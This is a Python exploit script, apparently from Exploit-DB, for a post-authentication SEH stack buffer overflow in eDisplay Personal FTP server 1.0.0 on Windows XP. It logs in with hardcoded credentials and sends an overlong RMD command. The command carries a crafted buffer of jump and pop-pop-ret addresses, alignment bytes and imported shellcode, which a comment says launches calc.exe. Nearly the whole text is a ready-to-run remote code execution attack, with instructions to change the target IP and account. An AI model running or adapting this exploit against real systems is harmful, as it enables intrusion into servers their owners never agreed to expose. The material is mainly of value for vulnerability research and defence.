# Exploit Title : eDisplay Personal FTP server 1.0.0 Multiple Post-Authentication Stack BOF
# Type of sploit: Remote Code Execution
# Bug found by  : loneferret  (march 19, 2010)
# Reference     : http://www.exploit-db.com/exploits/11810
# Exploit date  : March 24, 2010
# Author        : Sud0
# Version       : 1.0.0
# OS            : Windows
# Tested on     : XP SP3 En (VirtualBox)
# Type of vuln  : SEH
# Greetz to     : corelanc0d3r and of course my friends and .... first of all my wife for supporting me and my obsession :)
# Change IP and ftp account according to your server

from time import sleep
from payload import buf
import socket
import struct
def shell_attack(target_machine, target_port):
 
    junk=b"B" * 37 #seh overwritten after 37 bytes
    nseh= b"\x74\x20\x74\x20" # jmp forward (used a JE to avoid Bad Chars)
    seh= b"\x69\x40\x2b\x20" # ppr from 

    #shellcode for calc.exe encoded with Alpha2 basereg = eax

    #shellcode to align eax for decoder
    align=b"\x5A\x5A\x5A\x52\x58\x2D\x3B\x55\x55\x55\x2D\x3B\x55\x55\x55\x2D\x3B\x55\x55\x55"

    buffer= junk+nseh+seh + b"C"* 26  + align + b"C" * 25 + buf + b"A" * 50


    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    connect=s.connect((target_machine,target_port))
    s.recv(1024)
    s.send(b'USER fox\r\n')
    s.recv(1024)
    s.send(b'PASS mulder\r\n')
    s.recv(1024)
    s.send(b'RMD ' + buffer + b'\r\n')
    s.close